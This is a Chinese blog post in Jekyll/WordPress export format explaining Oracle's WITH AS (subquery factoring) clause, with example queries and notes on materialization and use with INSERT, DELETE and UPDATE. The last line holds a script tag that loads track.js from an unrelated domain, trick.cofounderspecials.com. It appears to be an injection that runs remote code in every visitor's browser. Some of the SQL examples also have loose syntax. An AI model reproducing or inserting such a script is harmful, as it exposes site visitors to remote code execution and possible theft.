---
layout: post
title: with as 在oracle中的运用
date: 2019-11-14 15:56:30.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Oracle
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2019/11/14/with-as-%e5%9c%a8oracle%e4%b8%ad%e7%9a%84%e8%bf%90%e7%94%a8/"
---
<p>语法：</p>
<div class="cnblogs_code">
<pre>with tempName as (select ....)
select ...</pre>
</div>
<p>--针对一个别名<br />
with tmp as (select * from tb_name)</p>
<p>--针对多个别名<br />
with<br />
tmp as (select * from tb_name),<br />
tmp2 as (select * from tb_name2),<br />
tmp3 as (select * from tb_name3),<br />
…</p>
<p>--相当于建了个e临时表<br />
with e as (select * from scott.emp e where e.empno=7499)<br />
select * from e;</p>
<p>--相当于建了e、d临时表<br />
with<br />
e as (select * from scott.emp),<br />
d as (select * from scott.dept)<br />
select * from e, d where e.deptno = d.deptno;</p>
<p>with as 相当于虚拟视图。</p>
<p>with as短语，也叫做子查询部分(subquery factoring)，可以让你做很多事情，定义一个sql片断，该sql片断会被整个sql语句所用到。</p>
<p>有的时候，是为了让sql语句的可读性更高些，也有可能是在union all的不同部分，作为提供数据的部分。</p>
<p>特别对于union all比较有用。</p>
<p>因为union all的每个部分可能相同，但是如果每个部分都去执行一遍的话，则成本太高，所以可以使用with as短语，则只要执行一遍即可。</p>
<p>如果with as短语所定义的表名被调用两次以上，则优化器会自动将with as短语所获取的数据放入一个temp表里，如果只是被调用一次，则不会。</p>
<p>而提示materialize则是强制将with as短语里的数据放入一个全局临时表里。</p>
<p>很多查询通过这种方法都可以提高速度。</p>
<p>with<br />
sql1 as (select to_char(a) s_name from test_tempa),<br />
sql2 as (select to_char(b) s_name from test_tempb where not exists (select s_name from sql1 where rownum=1))<br />
select * from sql1<br />
union all<br />
select * from sql2<br />
union all<br />
select 'no records' from dual<br />
where not exists (select s_name from sql1 where rownum=1)<br />
and not exists (select s_name from sql2 where rownum=1);</p>
<p>由于with as是内存中的table所以还是比较快的。如果数据比较大的时候建议不要用with as这样的话变得很慢。</p>
<div>WITH AS 与增删改查结合用法</div>
<div>注意：1.with必须紧跟引用的select语句</div>
<div>2.with创建的临时表必须被引用，否则报错</div>
<div></div>
<div>select 与 with as 连用</div>
<div>with tmp as （select * from 表名）  select * from tmp</div>
<div>insert into 与with as 连用</div>
<div>insert into 表名（字段名） with  tmp as （select * from 表） select * from tmp</div>
<div>delete 与with as 连用</div>
<div>delete from 表名 where exists （with tmp as select * from 表  select  * from tmp）</div>
<div>update 与 with as 连用</div>
<div>update 表名 a  set a.字段= （with tmp as select * from 表 select 字段 from tmp where tmp.字段 = a.字段）</div>
<div></div>
<p>&nbsp;<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
